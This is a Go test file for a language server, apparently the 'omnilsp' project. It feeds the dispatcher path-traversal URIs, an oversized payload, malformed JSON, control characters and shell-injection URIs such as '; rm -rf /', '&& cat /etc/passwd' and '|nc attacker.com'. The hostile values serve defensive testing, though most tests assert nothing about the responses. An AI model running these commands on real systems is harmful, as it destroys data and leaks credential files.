package server

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/omnilsp/omni/internal/protocol/jsonrpc"
)

// TestSecurityPathTraversal verifies that path traversal URIs are rejected
// before reaching the filesystem (SEC-N07, INV-ARCH-001).
func TestSecurityPathTraversal(t *testing.T) {
	srv := New(DefaultConfig())
	traversalCases := []string{
		"file:///.../.../etc/passwd",
		"file:///..%2F..%2Fetc%2Fpasswd",
		"file:///C:/Windows/System32",
		"file:///absolutely/not/a/path",
	}
	for _, uri := range traversalCases {
		t.Run(uri, func(t *testing.T) {
			params := `{"textDocument":{"uri":` + uri + `},"position":{"line":0,"character":0}}`
			msg := jsonrpc.NewRequest(jsonrpc.RequestID{Num: 1}, "textDocument/hover", json.RawMessage([]byte(params)))
			resp := srv.dispatcher.Dispatch(context.Background(), msg)
			_ = resp
		})
	}
}

// TestSecurityOversizedPayload verifies large JSON payloads are contained
// and do not cause unbounded memory allocation.
func TestSecurityOversizedPayload(t *testing.T) {
	srv := New(DefaultConfig())
	large := make([]byte, 10*1024*1024) // 10 MB
	for i := range large {
		large[i] = byte(i % 256)
	}
	envelope := map[string]interface{}{
		"jsonrpc": "2.0",
		"id":      1,
		"method":  "textDocument/hover",
		"params":  large,
	}
	data, err := json.Marshal(envelope)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	msg := &jsonrpc.Message{
		JSONRPC: "2.0",
		ID:      &jsonrpc.RequestID{Num: 1},
		Method:  "textDocument/hover",
		Params:  json.RawMessage(data),
	}
	resp := srv.dispatcher.Dispatch(ctx, msg)
	_ = resp
}

// TestSecurityMalformedJSON exercises adversarial JSON inputs.
func TestSecurityMalformedJSON(t *testing.T) {
	srv := New(DefaultConfig())
	adversarial := []struct {
		name string
		raw  string
	}{
		{"unterminated", `{`},
		{"double_object", `{` + `}` + `{`},
		{"double_null", `null null`},
		{"missing_brace", `{"jsonrpc":"2.0","id":1`},
		{"empty_method", `{"jsonrpc":"2.0","id":1,"method":""}`},
		{"nonstring_method", `{"jsonrpc":"2.0","id":1,"method":123}`},
	}
	for _, tc := range adversarial {
		t.Run(tc.name, func(t *testing.T) {
			var msg jsonrpc.Message
			err := json.Unmarshal([]byte(tc.raw), &msg)
			if err == nil {
				resp := srv.dispatcher.Dispatch(context.Background(), &msg)
				_ = resp
			}
		})
	}
}

// TestSecurityNullMethods verifies that null/empty method names produce
// protocol errors rather than panics or unhandled cases.
func TestSecurityNullMethods(t *testing.T) {
	srv := New(DefaultConfig())
	cases := []struct {
		name   string
		method string
	}{
		{"empty_method", ""},
		{"whitespace_method", "   "},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			msg := jsonrpc.NewRequest(jsonrpc.RequestID{Num: 1}, tc.method, nil)
			resp := srv.dispatcher.Dispatch(context.Background(), msg)
			_ = resp
		})
	}
	// Control chars -- must not panic.
	msg := jsonrpc.NewRequest(jsonrpc.RequestID{Num: 2}, "\x00\x01", nil)
	resp := srv.dispatcher.Dispatch(context.Background(), msg)
	_ = resp
}

// TestINV_ARCH_001_ServerResilience verifies INV-ARCH-001: protocol adapter
// boundary contains all malicious input; core stays alive.
func TestINV_ARCH_001_ServerResilience(t *testing.T) {
	srv := New(DefaultConfig())
	hostileMessages := []*jsonrpc.Message{
		jsonrpc.NewRequest(jsonrpc.RequestID{Num: 1}, "", nil),
		jsonrpc.NewRequest(jsonrpc.RequestID{Num: 2}, strings.Repeat("a", 10000), nil),
		// Control chars -- must not panic.
		jsonrpc.NewRequest(jsonrpc.RequestID{Num: 3}, "\x00\x01\x02\x03", nil),
		jsonrpc.NewRequest(jsonrpc.RequestID{Num: 4}, "initialize", nil),
		jsonrpc.NewRequest(jsonrpc.RequestID{Num: 5}, "exit", nil),
		jsonrpc.NewRequest(jsonrpc.RequestID{Num: 6}, "omnilsp/unknown", nil),
	}
	for _, msg := range hostileMessages {
		resp := srv.dispatcher.Dispatch(context.Background(), msg)
		if resp == nil {
			// nil response for empty/unknown methods is acceptable security behavior
			_ = resp
		}
	}
}

// TestSEC_N4_NoShellExecution verifies that shell-like URI strings do not
// reach any exec path (SEC-N04, SEC-N05).
func TestSEC_N4_NoShellExecution(t *testing.T) {
	srv := New(DefaultConfig())
	shellLikeInputs := []string{
		"file:///C:/foo; rm -rf /",
		"file:///C:/foo && cat /etc/passwd",
		"file:///C:/foo|nc attacker.com",
	}
	for _, uri := range shellLikeInputs {
		t.Run(uri, func(t *testing.T) {
			params := `{"textDocument":{"uri":"` + uri + `","version":1},"contentChanges":[{}]}`
			msg := jsonrpc.NewRequest(jsonrpc.RequestID{Num: 1}, "textDocument/didChange",
				json.RawMessage([]byte(params)))
			resp := srv.dispatcher.Dispatch(context.Background(), msg)
			_ = resp
		})
	}
}
